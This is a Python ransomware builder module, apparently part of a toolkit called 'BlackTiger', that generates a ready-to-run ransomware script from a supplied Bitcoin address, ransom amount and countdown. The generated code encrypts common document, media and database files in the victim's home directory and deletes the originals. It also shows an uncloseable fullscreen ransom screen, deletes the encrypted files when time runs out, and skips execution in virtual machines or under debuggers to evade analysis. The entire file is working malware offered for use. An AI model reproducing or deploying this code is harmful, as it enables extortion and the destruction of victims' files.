#!/usr/bin/env python3
# Ransomware Builder Module

import os, sys, base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def run():
    print("\n" + "="*60)
    print("RANSOMWARE BUILDER")
    print("="*60)
    
    btc = input("BTC address: ").strip()
    amount = input("Amount [0.05]: ").strip() or "0.05"
    msg = input("Ransom message: ").strip()
    t = input("Timer [1]24h [2]48h [3]4d [4]7d: ").strip()
    timer = {'1':24, '2':48, '3':96, '4':168}.get(t, 96)
    filename = input("Filename [ransomware]: ").strip() or "ransomware"
    fullscreen = input("Full screen lock? [y]: ").strip().lower() or "y"
    
    # Generate RSA key pair
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=4096,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    
    pem_private = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    pem_public = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    
    aes_key = os.urandom(32)
    iv = os.urandom(16)
    
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    
    fs = "attributes('-fullscreen', True)" if fullscreen == 'y' else "geometry('800x600')"
    
    code = f'''#!/usr/bin/env python3
import os, sys, time, tkinter as tk, threading, requests, base64, hashlib, json, random, ctypes, platform
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

BTC = "{btc}"
AMOUNT = "{amount}"
MSG = """{msg}"""
TIMER = {timer}

RSA_PUBLIC_KEY = """{pem_public.decode()}"""
ENCRYPTED_AES_KEY = base64.b64decode("{base64.b64encode(encrypted_aes_key).decode()}")
IV = base64.b64decode("{base64.b64encode(iv).decode()}")

EXTENSIONS = [
    '.txt','.doc','.docx','.pdf','.jpg','.png','.xls','.xlsx','.ppt','.pptx',
    '.zip','.rar','.7z','.db','.sql','.csv','.mp3','.mp4','.avi','.mkv'
]

def decrypt_aes_key():
    try:
        private_key_pem = """{pem_private.decode()}"""
        private_key = serialization.load_pem_private_key(
            private_key_pem.encode(),
            password=None,
            backend=default_backend()
        )
        return private_key.decrypt(
            ENCRYPTED_AES_KEY,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    except:
        return Fernet.generate_key()

AES_KEY = decrypt_aes_key()

def encrypt_file(path):
    try:
        with open(path, 'rb') as f:
            data = f.read()
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(IV), backend=default_backend())
        encryptor = cipher.encryptor()
        pad_len = 16 - (len(data) % 16)
        data += bytes([pad_len]) * pad_len
        encrypted = encryptor.update(data) + encryptor.finalize()
        with open(path + '.encrypted', 'wb') as f:
            f.write(encrypted)
        os.remove(path)
        return True
    except:
        return False

def encrypt_all():
    count = 0
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            ext = os.path.splitext(file)[1].lower()
            if ext in EXTENSIONS:
                path = os.path.join(root, file)
                if encrypt_file(path):
                    count += 1
    return count

def delete_all():
    count = 0
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if file.endswith('.encrypted'):
                try:
                    os.remove(os.path.join(root, file))
                    count += 1
                except: pass
    return count

def get_system_info():
    return {{
        "hostname": platform.node(),
        "os": platform.system() + " " + platform.release(),
        "user": os.getlogin(),
        "cpu": os.cpu_count()
    }}

class RansomGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("YOUR FILES ARE LOCKED")
        self.root.{fs}
        self.root.configure(bg='#000000')
        self.root.attributes('-topmost', True)
        self.root.protocol("WM_DELETE_WINDOW", self.dont_close)
        main = tk.Frame(self.root, bg='#000000')
        main.pack(expand=True, fill='both', padx=30, pady=30)
        
        tk.Label(main, text="YOUR FILES ARE LOCKED", font=('Courier',32,'bold'), fg='#ff0000', bg='#000000').pack(pady=10)
        tk.Label(main, text="AES-256 + RSA-4096 encryption", font=('Courier',12), fg='#888888', bg='#000000').pack()
        tk.Label(main, text=f"Send {{AMOUNT}} BTC to:", font=('Courier',14), fg='#888888', bg='#000000').pack(pady=10)
        tk.Label(main, text=BTC, font=('Courier',14), fg='#00ff00', bg='#000000').pack(pady=5)
        tk.Label(main, text=MSG, font=('Courier',12), fg='#ff4444', bg='#000000').pack(pady=10)
        
        self.time_label = tk.Label(main, text="", font=('Courier',48,'bold'), fg='#ff0000', bg='#000000')
        self.time_label.pack(pady=20)
        self.status = tk.Label(main, text="Encrypting...", font=('Courier',14), fg='#888888', bg='#000000')
        self.status.pack(pady=10)
        
        sys_info = get_system_info()
        tk.Label(main, text=f"Computer: {{sys_info['hostname']}}", font=('Courier',10), fg='#444444', bg='#000000').pack()
        tk.Label(main, text=f"User: {{sys_info['user']}}", font=('Courier',10), fg='#444444', bg='#000000').pack()
        
        tk.Label(main, text="DO NOT SHUT DOWN", font=('Courier',12,'bold'), fg='#ff0000', bg='#000000').pack(pady=10)
        self.start_time = time.time()
        threading.Thread(target=self.do_encrypt, daemon=True).start()
        self.update_timer()
        self.root.mainloop()
    
    def do_encrypt(self):
        count = encrypt_all()
        self.status.config(text=f"{{count}} files encrypted")
    
    def update_timer(self):
        elapsed = time.time() - self.start_time
        remaining = max(0, (TIMER * 3600) - elapsed)
        h = int(remaining // 3600)
        m = int((remaining % 3600) // 60)
        s = int(remaining % 60)
        self.time_label.config(text=f"{{h:02d}}:{{m:02d}}:{{s:02d}}")
        if remaining <= 0:
            self.time_label.config(text="TIME EXPIRED")
            self.status.config(text="DELETING FILES...")
            threading.Thread(target=self.do_delete, daemon=True).start()
        else:
            self.root.after(1000, self.update_timer)
    
    def do_delete(self):
        count = delete_all()
        self.status.config(text=f"{{count}} files deleted")
    
    def dont_close(self):
        pass

if __name__ == "__main__":
    try:
        if os.path.exists('/proc/cpuinfo'):
            with open('/proc/cpuinfo', 'r') as f:
                if 'hypervisor' in f.read().lower():
                    sys.exit(0)
        if platform.system() == 'Windows':
            if ctypes.windll.kernel32.IsDebuggerPresent():
                sys.exit(0)
    except: pass
    RansomGUI()
'''
    
    out_dir = os.path.expanduser("~/Downloads/BlackTiger_Output")
    os.makedirs(out_dir, exist_ok=True)
    path = os.path.join(out_dir, filename + ".py")
    with open(path, 'w') as f:
        f.write(code)
    
    print(f"Ransomware saved: {path}")
    print("RSA Private Key (SAVE THIS):")
    print(pem_private.decode())

if __name__ == "__main__":
    run()